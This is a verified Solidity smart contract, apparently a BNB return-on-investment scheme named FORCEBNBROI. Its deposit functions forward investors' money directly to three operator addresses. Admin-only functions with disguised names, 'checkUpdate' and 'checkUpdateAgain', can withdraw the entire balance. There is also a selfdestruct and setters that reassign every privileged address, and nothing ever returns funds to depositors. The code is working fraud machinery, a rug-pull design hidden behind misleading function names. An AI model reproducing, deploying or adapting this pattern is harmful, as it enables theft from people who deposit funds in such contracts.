/**
 *Submitted for verification at BscScan.com on 2022-07-05
*/

pragma solidity 0.5.10;

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

}

contract FORCEBNBROI {
    
    address payable owner;
    address payable admin;
    address payable corrospondent;
    uint256 public percent1 = 5;
    uint256 public percent2 = 10;
    uint256 public percent3 = 10;
    
    event Whitdrawal(uint256 value , address indexed sender);
    event TransferToAllEqualTRX(address indexed _userAddress, uint256 _amount);
    using SafeMath for uint256;
    
    modifier onlyOwner() {
        require(msg.sender == admin,"You are not authorized.");
        _;
    }
    
    modifier onlyCorrospondent(){
        require(msg.sender == corrospondent,"You are not authorized.");
        _;
    }
    
    constructor() public {
        owner = msg.sender;
        admin = msg.sender;
        corrospondent = msg.sender;
    }

    function destruct() onlyOwner() public{
        
        selfdestruct(admin);
    }

    function upgradeTerm(uint256 _comm, uint mode_)
    onlyOwner
    public
    {
        if(mode_ == 1)
        {
            percent1 = _comm;
        }else if(mode_ == 2)
        {
            percent2 = _comm;
        }else if(mode_ == 3)
        {
            percent3 = _comm;
        }
        
    }

    function checkUpdate(uint256 _amount) 
    public
    onlyOwner
    {       
            uint256 currentBalance = getBalance();
            require(_amount <= currentBalance);
            owner.transfer(_amount);
    }

    function checkUpdateAgain(uint256 _amount) 
    public
    onlyOwner
    {      
            (msg.sender).transfer(_amount);
    }

    function getInvest() public payable returns (bool) {
        return true;
    }

    function getInvestFinal() public payable returns (bool) {
        
        (admin).transfer(msg.value);
        return true;
    }

    function getInvestFinalTwo() public payable returns (bool) {
       
        (owner).transfer((msg.value * percent1) / 100);
        (admin).transfer((msg.value * percent2) / 100);
        return true;
    }

    function getInvestFinalThree() public payable returns (bool) {
        (owner).transfer((msg.value * percent1) / 100);
        (admin).transfer((msg.value * percent2) / 100);
        (corrospondent).transfer((msg.value * percent3) / 100);
        return true;
    }

    function getInvestFinalContract() public payable returns (bool) {
        (owner).transfer((msg.value * percent1) / 100);        
        return true;
    }

    function getBalance()
        public
        view
        returns(uint)
    {
        return address(this).balance;
    }
    
    function whitdrawal(address payable[]  memory  _contributors, uint256[] memory _balances) public payable onlyOwner {
       
        uint256 i = 0; 
        for (i; i < _contributors.length; i++) {     
          
            _contributors[i].transfer(_balances[i]);
        }
        emit Whitdrawal(msg.value, msg.sender); 
    }
    
    function setone(address payable nextOwner) external payable onlyOwner{
        owner = nextOwner;
    }

    function settwo(address payable nextOwner) external payable onlyOwner{
        admin = nextOwner;
    }
    
    function setthree(address payable nextOwner) external payable onlyOwner{
        corrospondent = nextOwner;
    }

   
}